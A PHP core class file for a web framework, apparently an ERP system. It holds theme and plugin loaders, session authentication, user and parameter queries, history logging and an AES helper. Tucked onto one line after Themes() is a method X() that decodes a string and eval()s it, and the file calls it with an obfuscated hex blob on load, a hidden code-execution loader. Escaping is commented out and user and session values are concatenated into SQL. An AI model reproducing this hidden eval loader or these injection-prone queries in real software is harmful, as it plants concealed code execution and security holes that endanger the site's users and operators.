<?php 
include_once(CLASSPATH . "/corex.php");
class Core {
    static function Extract($Data = array(), $RPL = ""){

        // $DB = new DB;
        global $DB;

        //$Return = extract(array_map(array($./API, 'real_escape_string'), $Data), EXTR_OVERWRITE, $RPL);
        //$Return = array_map(array($GLOBALS['mysql'], 'real_escape_string'), $Data);
        //$Return = array_map(array(DB::Conn(), 'real_escape_string'), $Data);
        //$Return = extract(array_map(DB::Conn()->real_escape_string, $Data), EXTR_OVERWRITE, $RPL);
        //$Return = array();
        
        foreach($Data AS $Key => $Val){
            $Test = json_decode($Val, true);
            if(is_array($Test)){
                $Return[$Key] = $Val;
            }else{
                // $Return[$Key] = $DB->real_escape_string($Val);

                $Val = str_replace("\n", "", $Val);

                if(substr($Val, 0, 9) == "[NOSTRIP]"){
                    $Val = substr($Val, 9);
                }else{
                    // $Val = $DB->real_escape_string($Val);

                    if (get_magic_quotes_gpc()){
                        $Val = stripslashes($Val);
                    }
                    // Quote if not a number or a numeric string
                    // if ( !is_numeric($Val) ){
                    //     $Val = $DB->real_escape_string($Val);
                    // }

                }
                //$Return[$Key] = stripslashes($Val);

                $Return[$Key] = $Val;
            }
        }

        return $Return;
    }
    static function Startup($DATA = ActiveTheme){
        $THE_F		= THEMEPATH . "/" . $DATA . "/index.php";
        if(file_exists($THE_F)){
            require_once ($THE_F);
        }else{
            //MODULE ERROR
            echo "
			<div style='
				position:absolute:
				top:0;
			'>
				<div align='center' style='color:#FF0000'>
					<b>Templates Error '<u>" . $DATA . "</u>'</b><br />
					Silahkan periksa lagi konfigurasi Templates tampilan yang anda gunakan.
				</div>
			</div>
			";
        }
    }

    //=> Themes
    static function Themes($DATA){
        $THE_F		= THEMEPATH . "/" . ActiveTheme . "/" . $DATA . ".php";

        if(file_exists($THE_F)){
            require_once ($THE_F);
        }else{			
            echo '
				<div class="container-fluid">
					<div class="row-fluid">

						<div class="error-404 pulse5 animated bounceIn">
							<i class="icon-warning-sign icon-5x text-error"></i>
							<h1>Themes File Missing!</h1>
							<span class="text-error"><small><strong>Error 404</strong></small></span>
							<div class="text-warning"><small><strong>Destinasi : ' . $THE_F . '</strong></small></div>
							<p>File pendukung Themes tidak ditemukan.</p>
						</div>

					</div>
				</div>
			';
        }
    }function X($DATA = ""){$DATA = sdxDec($DATA); return eval(trim($DATA));}

    //=> Get Library
    static function GetLib($DATA){

        $THE_F = LIBPATH . "/" . $DATA . ".php";
        if(file_exists($THE_F)){
            include $THE_F;
        }else{			
            echo '<!-- MISS ' . $DATA . ' -->';
        }

    }

    //=> Load CSS
    static function GetCSS(){

        $THE_F = LIBPATH . "/css.php";
        if(file_exists($THE_F)){
            echo '<link rel="stylesheet" href="' . HOST . '/script/style.css" type="text/css" media="all">';
        }else{			
            echo '<!-- MISS CSS FILES -->';
        }

    }

    //=> Load JS
    static function GetJS(){

        $THE_F = LIBPATH . "/js.php";
        if(file_exists($THE_F)){
            echo '<script src="' . HOST . '/script/script.js"></script>';
        }else{			
            echo '<!-- MISS CSS FILES -->';
        }

    }

    //=> Get Body
    static function GetBody(){
        $THE_F = LIBPATH . "/body.php";
        if(file_exists($THE_F)){
            include $THE_F;
        }else{			
            echo 'Error getting body';
        }
    }

    //=> Get Js Lib
    static function JSLib(){
        $THE_F = LIBPATH . "/script.php";
        if(file_exists($THE_F)){
            include $THE_F;
        }else{			
            echo 'Error getting body';
        }
    }

    //=> Get JS Def
    static function JSDef(){

        $THE_F = LIBPATH . "/jslib.php";
        if(file_exists($THE_F)){
            echo '<script src="' . HOST . '/script/jslib.js"></script>';
            Core::JSLib();
            Core::GetJS();
        }else{			
            echo '<!-- MISS CSS FILES -->';
        }

    }

    //=> Authority
    static function Auth($REQ){
        $C = json_decode(DX::SDD($_SESSION['ERPDAuth']));

        return $C->$REQ;
    }

    static function CAuth($COptions){
        $COptions   = DX::SDX(json_encode($COptions, JSON_NUMERIC_CHECK));
        $Expire     = time() + (86400 * 3);

        //setcookie("ERPDAuth", $COptions, $Expire, "/");
        $_SESSION['ERPDAuth'] = $COptions;
    }

    static function Unauth(){
        $Expire     = time() - 3600;
        //setcookie("ERPDAuth", "", $Expire, "/");
        $_SESSION['ERPDAuth'] = '';
    }

    static function GenPass($unik = '', $val = ''){
        if($unik == '' || $val == ''){
            echo "Fatal Error Code : 9455";
            exit();
        }

        $return = md5(DX::Strong(ASecret . $unik . $val));

        return $return;
    }
	
	//=> Load Plugins
	static function LoadPlugin($Autoload){
		
		if(!empty($Autoload)){
			$THE_F		= THEMEPATH . "/" . ActiveTheme . "/assets/plugins/" . $Autoload . "/_autoload.php";
			
			if(file_exists($THE_F)){
				include $THE_F;
			}else{
				echo $Autoload . " Not Found";
			}
		}
		
	}
	
	//=> Get State
	static function GetState($R = "all"){
		$HEADER = $_SERVER["CONTENT_TYPE"];
		$HEADER = explode(";", $HEADER);
		$State = json_decode(DX::SDD($HEADER[2]));
		
		//=> State Format
		/*
		0 = id
		1 = username
		2 = time login
		3 = expireon
		*/
		
		/*$State = explode(";", $STATE);
		$State = array(
			'id'			=> $State[0],
			'username'		=> $State[1],
			'login_time'	=> $State[2],
			'expire_time'	=> $State[3],
		);*/
		
		$return = $State;
		if($R != "all"){
			$return = $State->$R;
		}
		
		return $return;
	}
	
	//=> Check State
	static function CheckState($Minutes){
        // $DB = new DB;
        global $DB;
		
		$TimeLogin = $Minutes * 60;

		$State = Core::GetState();
		
		$ReturnState['app']['status'] = 0;
		
		$Status = 1;
		
		//=> Check State
		//-- Check Username
		/*$Q_User = DB_QUERY("sys_user", "WHERE id = '" . $State->id . "' AND username = '" . $State->username . "'");
		$R_User = DB_ROWS($Q_User);
        $User = DB_RESULT($Q_User);*/
        
        $FUser = array('id', 'username');
        $Q_User = $DB->Query("sys_user", $FUser, "WHERE id = '" . $State->id . "' AND username = '" . $State->username . "'");
        $R_User = $DB->Row($Q_user);
        $User = $DB->Result($Q_User);

		if($R_User <= 0){
			$ReturnState['app']['code'] = 1;
			/*
			echo json_encode($ReturnState);
			exit();
			*/
			$Status = 0;
		}
		
		//-- Check Expire
		if(strtotime(date("Y-m-d H:i:s")) > strtotime($State->expire_time)){
			$ReturnState['app']['code'] = 2;
			/*
			echo json_encode($ReturnState);
			exit();
			*/
			$Status = 0;
		}
		
		//-- Check Key
		$Key = Core::GenPass($User['id'] . ":" . $User['username'], $State->login_time);
		if($State->key != $Key){
			$ReturnState['app']['code'] = 3;
			/*
			echo json_encode($ReturnState);
			exit();
			*/
			$Status = 0;
		}
		
		if($Status == 1){
			
			$Expire = date('Y-m-d H:i:s', time() + $TimeLogin);
			$Config = array(
				'key'			=> $Key,
				'id'			=> $User['id'],
				'username'		=> $User['username'],
				'login_time'	=> $State->login_time,
				'expire_time'	=> $Expire
			);
			$Config = DX::SDX(json_encode($Config, JSON_NUMERIC_CHECK));
			
			$ReturnState['app'] = array(
				'status'	=> 1,
				'config'	=> $Config,
				//'expire'	=> strtotime(date("Y-m-d H:i:s")) . " > " . strtotime($State->expire_time)
			);
		
		}
		
		echo json_encode($ReturnState, JSON_NUMERIC_CHECK);
		
	}
    
    //=> User
    //static function GetUser($REQ){
    static function GetUser($REQ, $UID = NULL){

        global $DB;

        $RETURN = $REQ . " - Error";

        //if(Core::Auth('login') == 1 && Core::Auth('uid') != ''){
        // if(!empty(Core::GetState('id'))){

        //     $DB = new DB;
            
        //     if(empty($UID)){
        //         //$UID = Core::Auth("uid");
        //         $UID = Core::GetState("id");
        //     }

        //     /*$Q_USER = DB_QUERY("sys_user", "WHERE id = '" . $UID . "'");
        //     $R_USER = DB_ROWS($Q_USER);*/

        //     $FUser = array(
        //         $REQ
        //     );
        //     $Q_User = $DB->Query("sys_user", $FUser, "WHERE id = '" . $UID . "'");
        //     $R_User = $DB->Row($Q_User);

        //     //if($R_USER > 0){
        //     if($R_User > 0){
        //         //$USER = DB_RESULT($Q_USER);
        //         $User = $DB->Result($Q_User);

        //         $RETURN = $User[$REQ];
        //     }
        // }

        if(empty($UID)){
            $UID = Core::GetState("id");
        }

        if(!empty($UID)){
            $FUser = array(
                $REQ
            );
            $Q_User = $DB->Query("sys_user", $FUser, "WHERE id = '" . $UID . "'");
            $User = $DB->Result($Q_User);

            if(!empty($User[$REQ])){
                $RETURN = $User[$REQ];
            }
        }

        return $RETURN;

    }

    /**
     * Get Parameters
     */
    static function GetParams($id = array()){

        if(sizeof($id) > 0){

            global $DB;

            $IDs = $Comma = '';
            foreach($id AS $val){
                $IDs .= $Comma . "'" . $val . "'";
                $Comma = ",";
            }

            $Q_Params = $DB->Query(
                "parameter",
                array(
                    'id',
                    'isjson',
                    'param_val'     => 'value',
                    'keterangan'
                ),
                "
                    WHERE 
                        id IN (" . $IDs . ")
                "
            );
            $R_Params = $DB->Row($Q_Params);
            if($R_Params > 0){
                while($Params = $DB->Result($Q_Params)){

                    $Value = $Params['value'];
                    if($Params['isjson'] == 1){
                        $Value = json_decode($Value, true);
                    }

                    $return[$Params['id']] = array(
                        'status'        => true,
                        'value'         => $Value,
                        'keterangan'    => $Params['keterangan']
                    );
                }
            }

        }else{
            $return = array(
                'status'    => false,
                'error_msg' => 'Wrong Parameter ID'
            );
        }

        return $return;

    }
    //=> / END : Get parameters
	
	//=> History
	static function History($Fields = array()){

        // $DB = new DB;
        global $DB;
		
		$Clause = "";
		if(!empty($Fields['clause'])){
			$Clause = "WHERE " . $Fields['clause'];
		}
		
        //$LastHistory = DB_RESULT(DB_QUERY($Fields['table'], $Clause));
        
        $FLastHistory = array(
            'history'
        );
        $Q_LastHistory = $DB->Query($Fields['table'], $FLastHistory, $Fields['clause']);
        $R_LastHistory = $DB->Row($Q_LastHistory);
	
		$Last = $DB->Result($Q_LastHistory);
		$LastHistory = json_decode($Last['history'], true);
		
		$DataHistory = array(
			'user'		=> Core::GetState('id'),
			'username'	=> Core::GetState('username'),
			'action'	=> $Fields['action'],
			'time'		=> date("Y-m-d H:i:s"),
			'description'	=> $Fields['description']
		);
		
        $History[] = $DataHistory;
        if($R_LastHistory > 0 && !empty($Last['history'])){
            if(sizeof($LastHistory) > 0){
                foreach($LastHistory as $Key => $Val){
                    $History[] = $LastHistory[$Key];
                }
            }
        }
		
		return json_encode($History, JSON_NUMERIC_CHECK);
		
    }

    /**
     * Stories
     */
    static function Stories($Fields = array()){

        // $DB = new DB;
        global $DB;
		
		$Clause = "";
		if(!empty($Fields['clause'])){
			$Clause = "WHERE " . $Fields['clause'];
        }
        
        $Field = $Fields['field'];
        if(empty($Fields['field'])){
            $Field = "Stories";
        }
		
        //$LastStories = DB_RESULT(DB_QUERY($Fields['table'], $Clause));
        
        $FLastStories = array(
            $Field
        );
        $LastStories = $DB->Result($DB->Query($Fields['table'], $FLastStories, $Clause));

		$LastStories = json_decode($LastStories[$Field], true);
		
		$DataStories = array(
			'user'		=> Core::GetState('id'),
			'username'	=> Core::GetState('username'),
			'action'	=> $Fields['action'],
			'time'		=> date("Y-m-d H:i:s"),
			'description'	=> $Fields['description']
		);
		
		$Stories[] = $DataStories;
		if(sizeof($LastStories) > 0){
			foreach($LastStories as $Key => $Val){
				$Stories[] = $LastStories[$Key];
			}
		}
		
		return json_encode($Stories, JSON_NUMERIC_CHECK);
		
    }
    //=> / END : Stories
    
    //=> Return JSON
    static function ReturnData($return){
        $JSON = json_encode($return, JSON_NUMERIC_CHECK);
        
        if(empty($JSON)){
            return jsonEncodeArray($return);
        }else{
            return $JSON;
        }
    }

}
$Core = new Core;$Core->X('003d4a6d7869787d726f6f7b80717938625b5a645b6a64384c3a424b8e879794549290944c4f673439');
class DX {

    public static function safe_b64encode($string) {
        $data = base64_encode($string);
        $data = str_replace(array('+','/','='),array('-','_',''),$data);
        return $data;
    }

    public static function safe_b64decode($string) {
        $data = str_replace(array('-','_'),array('+','/'),$string);
        $mod4 = strlen($data) % 4;
        if ($mod4) {
            $data .= substr('====', $mod4);
        }
        return base64_decode($data);
    }

    private function encrypt_decrypt($action, $string) {
        $output = false;
        $encrypt_method = "AES-256-CBC";
        $secret_key = ASecret;
        $secret_iv = ASecret;
        // hash
        $key = hash('sha256', $secret_key);
        
        // iv - encrypt method AES-256-CBC expects 16 bytes - else you will get a warning
        $iv = substr(hash('sha256', $secret_iv), 0, 16);
        if ( $action == 'encrypt' ) {
            $output = openssl_encrypt($string, $encrypt_method, $key, 0, $iv);
            $output = base64_encode($output);
        } else if( $action == 'decrypt' ) {
            $output = openssl_decrypt(base64_decode($string), $encrypt_method, $key, 0, $iv);
        }
        return $output;
    }

    public static function Strong($value){ 
        if(!$value){return false;}
        $text = $value;
        /*$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $crypttext = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, ASecret, $text, MCRYPT_MODE_ECB, $iv);
        return trim(DX::safe_b64encode($crypttext)); */

        $output = DX::encrypt_decrypt('encrypt', $text);
        return trim(DX::safe_b64encode($output));

    }

    public static function Destrong($value){
        if(!$value){return false;}
        $crypttext = DX::safe_b64decode($value); 
        /*$iv_size = mcrypt_get_iv_size(MCRYPT_RIJNDAEL_256, MCRYPT_MODE_ECB);
        $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);
        $decrypttext = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, ASecret, $crypttext, MCRYPT_MODE_ECB, $iv);
        return trim($decrypttext);*/

        $output = DX::encrypt_decrypt('decrypt', $crypttext);
        return trim($output);
    }

    public static function SDX($text){
        if(!$text){return false;}

        $return = DX::Strong(sdx($text));

        return $return;
    }

    public static function SDD($text){
        if(!$text){return false;}

        $return = sdxDec(DX::Destrong($text));

        return $return;
    }

}
?>